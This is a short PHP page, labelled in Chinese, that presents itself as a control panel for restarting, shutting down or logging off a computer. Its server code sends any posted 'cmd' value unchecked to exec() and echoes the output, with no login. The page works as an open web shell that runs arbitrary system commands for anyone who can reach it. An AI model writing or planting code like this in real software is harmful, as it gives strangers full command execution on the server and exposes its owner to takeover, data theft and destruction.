
<?php
if (isset($_POST['cmd'])) {
$cmd= stripslashes( $_POST['cmd'] );
exec( $cmd,$out);
var_dump($out);
echo '<br>';
var_dump($cmd);
} else {
?>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<form action="" method="post" name="form0" id="form0">
<p> </p>
<p align="center" >CMD</p>
<table width="200" border="0" align="center">
<tr>
<td width="81" height="18">选择:</td>
<td width="109"><select name="cmd">
<option value="shutdown -r" selected="selected">重启计算机</option>
<option value="shutdown -s">关闭计算机</option>
<option value="shutdown -l">注销当前用户</option>
</select></td>
</tr>
<tr>
<td> </td>
<td><input type="submit" name="Submit" value="提交" /></td>
</tr>
</table>
<p> </p>
</form>
<?php
}
